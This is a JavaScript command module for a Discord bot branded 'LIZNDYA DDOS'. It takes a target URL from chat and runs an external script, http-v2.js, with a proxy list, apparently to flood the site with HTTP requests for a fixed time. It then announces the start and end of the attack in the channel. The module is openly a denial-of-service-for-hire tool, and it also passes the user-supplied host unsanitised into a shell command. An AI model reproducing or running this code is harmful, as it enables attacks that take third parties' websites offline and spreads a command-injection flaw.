const Discord = require("discord.js");

exports.run = async (client, message, args) => {

const host = message.content.split (" ")[1]
const ayarlar = require('../ayarlar.json');
var room = ayarlar.commandroom;

if (message.channel.id != room) {
	return;
  }

if(!args[0]) {
	const embed1 = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **Loading Please Wait** 🚀')
	.setDescription("`Usage: .HTTP-V2 https://example.com/`")
	.setFooter("Please do not attack websites with domain .gov")
	message.channel.send(embed1);
	return;
	}

var exec = require('child_process').exec
exec(`node http-v2.js ${host} 90 1000 get ProxyViet.txt 150`, (error, stdout, stderr) => {
});
setTimeout(function(){ 
    console.log('The attack stopped the Discord ID:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **LIZNDYA DDOS** 🚀')
	.setTimestamp()
	.setDescription("**► Attack is over 💥**")
	.setFooter('© Developer: ROMEO', client.user.avatarURL)
	.setTimestamp()
	.setThumbnail("")
 message.channel.send(embed);
 }, 90000); //time in milliseconds
var gifler = ["https://blarrow.tech/wp-content/uploads/2020/06/featureAYUSHDUBEY.gif"];
    var randomgif = gifler[Math.floor((Math.random() * gifler.length))];
console.log('Start Attacking ID Discord:' +  message.guild.id)


const embed = new Discord.MessageEmbed()
	.setColor('RANDOM')
	.setTitle('🚀 **LIZNDYA DDOS** 🚀')
	.setTimestamp()
  .setDescription("**𝐔𝐬𝐞𝐫**: `" + message.author.username + "` \n **𝐇𝐨𝐬𝐭**: `" + host + "` \n **𝐌𝐞𝐭𝐡𝐨𝐝**: `HTTP-V2` \n **𝐓𝐢𝐦𝐞**: `𝟏𝟐𝟎 𝐒𝐞𝐜𝐜𝐨𝐧𝐝 `")	
  .setFooter('© Developer: ROMEO', client.user.avatarURL)
	.setTimestamp()
	.setImage(randomgif)
	.setThumbnail("")
 message.channel.send(embed);
  }

exports.conf = {
  enabled: true,
  guildOnly: false,
  aliases: ['HTTP-V2'],
  permLevel: 0
}

exports.help = {
  name: 'HTTP-V2',
  description: 'Tank',
  usage: 'HTTP-V2'
}
